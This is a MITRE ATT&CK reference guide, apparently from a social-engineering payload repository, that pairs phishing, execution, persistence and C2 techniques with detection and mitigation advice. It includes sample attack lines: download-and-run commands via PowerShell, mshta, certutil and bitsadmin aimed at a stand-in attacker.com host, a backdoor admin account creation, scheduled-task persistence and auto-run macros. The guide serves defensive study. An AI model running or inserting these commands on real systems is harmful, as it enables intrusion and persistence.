# MITRE ATT&CK Reference Guide

> **⚠️ DISCLAIMER**: This reference is for **educational and defensive security purposes ONLY**.
> Understanding attack techniques helps defenders build better detection and response capabilities.

---

## Overview

This document provides detailed MITRE ATT&CK technique references for all techniques observed
in social engineering payload scenarios. Each entry includes technique description, examples,
and defensive guidance.

**Source**: [MITRE ATT&CK® Enterprise Framework](https://attack.mitre.org/)

---

## Table of Contents

- [Initial Access Techniques](#initial-access)
- [Execution Techniques](#execution)
- [Persistence Techniques](#persistence)
- [Defense Evasion Techniques](#defense-evasion)
- [Collection Techniques](#collection)
- [Command & Control Techniques](#command-and-control)
- [Exfiltration Techniques](#exfiltration)
- [Lateral Movement Techniques](#lateral-movement)
- [Reconnaissance Techniques](#reconnaissance)

---

<a name="initial-access"></a>
## Initial Access

### T1566 — Phishing

Adversaries send phishing messages to gain initial access to victim systems. All phishing is
not the same; some may target specific individuals, while others are mass campaigns.

#### T1566.001 — Spearphishing Attachment

| Field | Value |
|-------|-------|
| **Tactic** | Initial Access |
| **Platform** | Linux, macOS, Windows, Office 365, SaaS |
| **Permissions Required** | User |
| **Data Sources** | Email, Network Traffic, Application Log |

**Description**: Adversaries send email messages with a malicious attachment. The attachment may
be a document, executable, or archive file that when opened or executed triggers malicious code.

**Social Engineering Techniques Used**:
- Financial lures (invoices, payment confirmations)
- Urgency triggers ("action required", "account suspended")
- Authority exploitation (CEO, IT, HR impersonation)
- Curiosity triggers (confidential documents, surveys)

**Payloads in This Repository**:
- DDE CSV/XLS/DOCX/SLK/MSG payloads
- Password protected documents
- PDF with malicious URLs
- LNK download and execute payloads
- Fake attachment scam

**Detection**:
```
- Monitor email for suspicious attachment types (.doc, .xls, .csv, .slk, .lnk, .pdf)
- Analyze Office documents for DDE fields
- Monitor for calc.exe or cmd.exe spawned from Office applications
- Windows Event ID 4688 (Process Creation)
- Sysmon Event ID 1 (Process Created) with parent process filter
```

**Mitigation**:
```
- M1049: Antivirus/Antimalware
- M1031: Network Intrusion Prevention  
- M1021: Restrict Web-Based Content
- M1054: Software Configuration (Protected View)
- M1017: User Training
```

---

#### T1566.002 — Spearphishing Link

| Field | Value |
|-------|-------|
| **Tactic** | Initial Access |
| **Platform** | Linux, macOS, Windows |
| **Permissions Required** | User |

**Description**: Instead of a file attachment, a malicious link redirects the user to an attacker-
controlled resource. The link may be obfuscated using URL shorteners, homograph attacks, or
legitimate services (Google, OneDrive) as redirectors.

**Payloads in This Repository**:
- Link manipulation attack
- Tabnabbing attack (variant)
- PDF with embedded malicious URL

**Evasion Techniques**:
- URL shorteners: bit.ly, tinyurl.com
- Legitimate service abuses: redirects via Google, GitHub
- Homograph attacks using Unicode lookalike characters
- Right-to-Left Override (RTLO) in filenames

**Detection**:
```
- Analyze all links in emails before delivery
- DNS lookups for newly registered domains
- Certificate Transparency logs for lookalike domains
- URL reputation services (VirusTotal, URLVoid)
```

**Mitigation**:
```
- M1054: Software Configuration (Safe Links)
- M1021: Restrict Web-Based Content
- M1017: User Training
- M1031: Network Intrusion Prevention
```

---

### T1189 — Drive-by Compromise

| Field | Value |
|-------|-------|
| **Tactic** | Initial Access |
| **Platform** | Linux, macOS, Windows |

**Description**: Adversaries gain access through web pages that deliver malicious content
exploiting browser vulnerabilities, typically via drive-by download. Combined with phishing
links, this creates a two-stage attack.

**Related Payloads**: PDF with malicious URL → web-based exploit landing page

---

### T1195 — Supply Chain Compromise

#### T1195.001 — Compromise Software Dependencies and Development Tools

| Field | Value |
|-------|-------|
| **Tactic** | Initial Access |
| **Platform** | Linux, macOS, Windows |

**Description**: Adversaries manipulate products or product delivery mechanisms prior to
receipt by a final consumer. Package repository compromise allows payload delivery to any
consumer of the compromised package.

**Example Attack Vectors**:
- NPM package typosquatting
- PyPI package with same name as internal package (dependency confusion)
- Compromised package maintainer account

---

<a name="execution"></a>
## Execution

### T1204 — User Execution

User execution requires the user to actively open a file or click a link.

#### T1204.001 — Malicious Link

| Field | Value |
|-------|-------|
| **Tactic** | Execution |
| **Platform** | Linux, macOS, Windows |

**Description**: User clicks a malicious link in an email, document, or website.

**Payloads**: Link manipulation, tabnabbing, PDF URLs

---

#### T1204.002 — Malicious File

| Field | Value |
|-------|-------|
| **Tactic** | Execution |
| **Platform** | Linux, macOS, Windows |

**Description**: User opens a malicious file, triggering execution.

**Payloads**: All DDE payloads, Office documents, LNK files, PDFs with JS

---

### T1059 — Command and Scripting Interpreter

#### T1059.001 — PowerShell

| Field | Value |
|-------|-------|
| **Tactic** | Execution |
| **Platform** | Windows |
| **Permissions Required** | User |

**Description**: PowerShell is a powerful scripting environment in Windows, frequently abused
by attackers for its flexibility and ubiquity.

**Payloads**: PowerShell on mouseover (PowerPoint), DDE payload downloading via PowerShell

**Common One-Liners** (for detection reference):
```powershell
# Download cradle (commonly seen in phishing payloads)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://.../')"

# Encoded command (evasion)
powershell -enc [base64-encoded-command]

# Hidden window
powershell -WindowStyle Hidden -ExecutionPolicy Bypass
```

**Detection**:
```
- Windows Event ID 4104 (Script Block Logging - requires policy)
- Windows Event ID 4103 (Module Logging)
- Windows Event ID 4688 (Process Creation with PowerShell as parent)
- Sysmon Event ID 1 with CommandLine filter
- AMSI (Antimalware Scan Interface) telemetry
```

---

#### T1059.003 — Windows Command Shell

**Description**: cmd.exe used to execute commands, download files, or spawn other processes.

**Common Patterns**:
```cmd
# DDE payload pattern
cmd /c calc.exe
cmd /k powershell -command [...]
cmd.exe /c mshta http://attacker.com/payload.hta
```

**Detection**:
```
- Process creation events with cmd.exe
- Parent process correlation (Office spawning cmd)
- Command line argument analysis
```

---

#### T1059.005 — Visual Basic

**Description**: VBScript and VBA used in Office documents to execute malicious code.

**Common Patterns** (for detection reference):
```vba
' Document_Open auto-execute
Sub Document_Open()
    Shell "cmd /c calc.exe"
End Sub

' AutoOpen in Excel
Sub Auto_Open()
    Call Shell("cmd /c calc.exe")
End Sub
```

**Detection**:
```
- AMSI integration with Office VBA
- Windows Script Host logging
- Office macro security event logs
```

---

#### T1059.007 — JavaScript

**Description**: JavaScript embedded in PDFs, HTML documents, or HTA files used for execution.

**Common Patterns** (for detection reference):
```javascript
// PDF embedded JS example
this.exportDataObject({cName: "payload", nLaunch: 2});

// HTA example
<script>new ActiveXObject("WScript.Shell").Run("calc.exe");</script>
```

---

### T1203 — Exploitation for Client Execution

| Field | Value |
|-------|-------|
| **Tactic** | Execution |
| **Platform** | Linux, macOS, Windows |

**Description**: Adversaries exploit vulnerabilities in client applications such as PDF readers,
web browsers, and Office applications.

**Relevant CVEs** (historical examples):
- CVE-2017-11882: Microsoft Office Memory Corruption
- CVE-2018-8174: VBScript Engine Memory Corruption (Double Kill)
- CVE-2021-40444: MSHTML Remote Code Execution

---

### T1218 — System Binary Proxy Execution

Using legitimate system binaries to execute malicious code, bypassing application whitelisting.

#### T1218.003 — CMSTP

```cmd
# CMSTP.exe executes malicious INF file
cmstp.exe /ni /s malicious.inf
```

#### T1218.005 — Mshta

```cmd
# mshta.exe executes remote HTA
mshta.exe http://attacker.com/payload.hta

# mshta.exe executes local HTA
mshta.exe "C:\Users\Public\payload.hta"
```

**Payloads**: LNK download and execute (mshta)

#### T1218.011 — Rundll32

```cmd
# rundll32.exe executing DLL
rundll32.exe C:\Users\Public\payload.dll,EntryPoint

# rundll32.exe via URL (advpack)
rundll32.exe advpack.dll,LaunchINFSection http://attacker.com/x.inf,DefaultInstall
```

---

<a name="persistence"></a>
## Persistence

### T1053 — Scheduled Task/Job

#### T1053.005 — Scheduled Task

```cmd
# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "cmd /c calc.exe" /sc daily /st 09:00

# Query scheduled tasks
schtasks /query /fo LIST /v
```

**Detection**:
```
- Windows Event ID 4698 (Scheduled Task Created)
- Windows Event ID 4700 (Scheduled Task Enabled)
- Sysmon Event ID 1 (schtasks.exe execution)
```

---

### T1547 — Boot or Logon Autostart Execution

#### T1547.001 — Registry Run Keys / Startup Folder

**Common Registry Locations**:
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

---

### T1136 — Create Account

#### T1136.001 — Local Account

```cmd
# Create backdoor local account
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add
```

---

### T1176 — Browser Extensions

**Description**: Adversaries install malicious browser extensions to persist access and
collect data from web browsers.

**Example extension manifest** (for detection reference):
```json
{
  "manifest_version": 2,
  "name": "Security Helper",
  "version": "1.0",
  "permissions": ["tabs", "webRequest", "storage", "http://*/*", "https://*/*"],
  "background": {"scripts": ["background.js"]},
  "content_scripts": [{"matches": ["<all_urls>"], "js": ["content.js"]}]
}
```

**Detection**:
```
- Monitor browser extension installations
- Audit extensions via enterprise management tools
- Alert on extensions with broad permissions
```

---

<a name="defense-evasion"></a>
## Defense Evasion

### T1027 — Obfuscated Files or Information

**Description**: Various encoding/obfuscation techniques to avoid detection.

#### Common Obfuscation Methods

**Base64 Encoding**:
```powershell
# Encoder (for detection reference)
$bytes = [System.Text.Encoding]::Unicode.GetBytes("calc.exe")
[Convert]::ToBase64String($bytes)
# Result: YwBhAGwAYwAuAGUAeABlAA==
```

**XOR Encoding** (simple example for detection reference):
```python
def xor_encode(data, key):
    return bytes([b ^ key for b in data.encode()])
```

**Environment Variable Substitution**:
```cmd
# Obfuscated calc.exe via env vars
set a=ca
set b=lc
set c=.exe
%a%%b%%c%
```

---

### T1036 — Masquerading

**Description**: Files, programs, or executables disguised as legitimate items.

#### T1036.002 — Right-to-Left Override

Unicode character U+202E reverses display order of filename characters.

```
document.‮cod.exe → displayed as: document.exe.doc
```

**Detection**:
```
- Monitor for U+202E in file names
- Alert on files where displayed extension differs from actual extension
```

---

### T1221 — Template Injection

**Description**: Office documents that load external templates on open, allowing attackers to
serve malicious macro templates from a remote server while keeping the initial document clean.

```xml
<!-- Word document's settings.xml -->
<w:attachedTemplate r:id="rId1"/>

<!-- Document.xml.rels -->
<Relationship Type=".../template" Target="http://attacker.com/template.dotm" TargetMode="External"/>
```

**Payloads**: macro-template-injection (enhanced payloads)

---

<a name="collection"></a>
## Collection

### T1056 — Input Capture

#### T1056.003 — Web Portal Capture

**Description**: Adversaries serve web pages that mimic legitimate login portals to capture
credentials.

**Characteristics**:
- HTML/CSS mimics legitimate portal exactly
- Form action posts to attacker-controlled endpoint
- SSL certificate may be valid (Let's Encrypt on lookalike domain)
- May auto-redirect to real portal after credential capture

**Detection**:
```
- Analyze form submission destinations
- SSL certificate transparency log monitoring
- Domain lookalike detection
- Browser process network traffic analysis
```

---

### T1111 — Multi-Factor Authentication Interception

**Description**: Adversaries intercept MFA credentials, often using real-time phishing
proxies (Evilginx2, Modlishka) that relay auth to the real site.

**How Real-Time MFA Phishing Works**:
```
Target → [Phishing Proxy] → Real Bank/Service
         (captures session token)
```

**Detection**:
```
- Impossible travel detection (auth from two locations simultaneously)
- Anomalous authentication patterns
- Session token abuse after authentication
```

---

### T1185 — Browser Session Hijacking

**Description**: Adversaries gain control of active browser sessions.

**Payloads**: Tabnabbing attack

**How Tabnabbing Works**:
```javascript
// Simplified example (educational)
window.addEventListener('blur', function() {
    // When user switches tabs, replace page with phishing content
    document.title = "Google - Sign In";
    document.querySelector('link[rel=icon]').href = '/favicon-google.ico';
    // Replace body with fake Google login form
});
```

**Detection**:
```
- Unusual JavaScript in web pages
- Content Security Policy violations
- Browser telemetry for suspicious DOM modifications
```

---

### T1187 — Forced Authentication

**Description**: Techniques that force a victim's system to authenticate to an attacker-
controlled resource, capturing credentials (especially NTLM hashes).

**Common Triggers**:
```
- Office documents with embedded UNC paths (\\attacker.com\share)
- PDF with embedded image from UNC path
- HTML email with image from UNC path
- SCF files in shared folders
```

**Detection**:
```
- Monitor for outbound SMB connections to external IPs
- Alert on NTLM authentication attempts to external hosts
- Windows Event ID 4625 (Account Login Failure)
- Network traffic analysis for SMB to non-internal hosts
```

---

### T1539 — Steal Web Session Cookie

**Description**: Steal session cookies to bypass authentication.

**Common Tools/Methods** (for detection reference):
- Browser developer tools export
- Network traffic interception (HTTP)
- Malicious browser extension
- JavaScript injection (XSS)

---

<a name="command-and-control"></a>
## Command & Control

### T1071 — Application Layer Protocol

Using standard protocols to blend C2 traffic with normal traffic.

#### T1071.001 — Web Protocols

```
HTTP/HTTPS GET/POST requests to C2 server
Common User-Agents to mimic normal browser traffic
Beaconing intervals with jitter
```

#### T1071.004 — DNS

```
# DNS tunneling example concepts
data.attacker.com = base64(data) + request
TXT records used for C2 responses
```

---

### T1105 — Ingress Tool Transfer

**Description**: Downloading tools/payloads from external sources.

**Common Methods**:
```powershell
# PowerShell (common in DDE payloads)
(New-Object Net.WebClient).DownloadFile('http://attacker.com/payload.exe', 'C:\temp\payload.exe')

# certutil (LOLBin)
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

# bitsadmin (LOLBin)
bitsadmin /transfer job /download /priority normal http://attacker.com/payload.exe C:\temp\payload.exe
```

---

<a name="exfiltration"></a>
## Exfiltration

### T1020 — Automated Exfiltration

**Description**: Automatically exfiltrate collected data, often as part of a macro or script.

### T1041 — Exfiltration Over C2 Channel

**Description**: Exfiltrate data through the same channel used for C2 communication.

---

<a name="lateral-movement"></a>
## Lateral Movement

### T1534 — Internal Spearphishing

**Description**: Adversaries use access to compromised accounts to send phishing messages
to other users in the organization.

**Why It's Effective**:
- Email comes from a trusted, known sender
- Bypasses external email filtering
- Social context makes it convincing ("as we discussed in the meeting")

**Detection**:
```
- Analyze all email content, not just external mail
- Alert on links and attachments in internal email from unusual senders
- User behavior analytics for unusual email sending patterns
```

---

### T1550 — Use Alternate Authentication Material

#### T1550.002 — Pass the Hash

**Description**: Use captured NTLM hash directly for authentication without knowing password.

---

<a name="reconnaissance"></a>
## Reconnaissance

### T1598 — Phishing for Information

Phishing specifically to gather information rather than deliver malware.

#### T1598.003 — Spearphishing Link

Sending links to gather information via fake forms, credential pages, etc.

---

### T1591 — Gather Victim Organization Information

#### T1591.002 — Business Relationships

Using information about vendor/partner relationships to craft convincing pretexts.

---

## MITRE Technique Cross-Reference

| Technique | Used in Chain 1 | Chain 2 | Chain 3 | Chain 4 | Chain 5 | Chain 6 | Chain 7 | Chain 8 |
|-----------|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|
| T1566.001 | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | | |
| T1566.002 | | ✓ | ✓ | | | | ✓ | |
| T1204.002 | ✓ | ✓ | ✓ | ✓ | | ✓ | | |
| T1059.003 | ✓ | | | ✓ | | ✓ | | |
| T1059.005 | | | | ✓ | | | | |
| T1056.003 | ✓ | ✓ | ✓ | | ✓ | ✓ | ✓ | |
| T1185     | | ✓ | | | | | ✓ | |
| T1053.005 | ✓ | | | ✓ | | | | |
| T1105     | ✓ | | ✓ | ✓ | | | | |
| T1078     | ✓ | ✓ | | | ✓ | | | |
| T1195.001 | | | | | | | | ✓ |

---

## References

- [MITRE ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [MITRE D3FEND](https://d3fend.mitre.org/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS Controls](https://www.cisecurity.org/controls/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
